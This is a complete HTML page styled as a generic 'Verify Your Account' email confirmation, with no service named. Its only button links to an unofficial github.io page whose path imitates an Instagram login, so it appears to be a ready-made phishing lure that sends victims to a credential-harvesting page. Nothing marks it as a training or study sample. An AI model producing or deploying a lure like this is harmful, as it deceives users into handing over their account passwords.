<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f4f4f9;
        }

        .container {
            text-align: center;
            background: #ffffff;
            padding: 2rem;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
        }

        h1 {
            color: #333;
            margin-bottom: 1rem;
        }

        p {
            color: #666;
            margin-bottom: 1.5rem;
            line-height: 1.5;
        }

        .verify-button {
            display: inline-block;
            padding: 0.75rem 1.5rem;
            background-color: #0e7bf0;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-size: 1rem;
            transition: background-color 0.3s;
        }

        .verify-button:hover {
            background-color: #187eea;
        }

        .footer {
            margin-top: 1.5rem;
            font-size: 0.875rem;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Verify Your Account</h1>
        <p>We need to confirm your email address to complete the account setup. Please click the button below to verify your account.</p>
        <a href="https://kwpc1.github.io/login/login/instagram.html" class="verify-button">Verify Account</a>
        <div class="footer">
            <p>If you did not create this account, please ignore this message.</p>
        </div>
    </div>
</body>
</html>
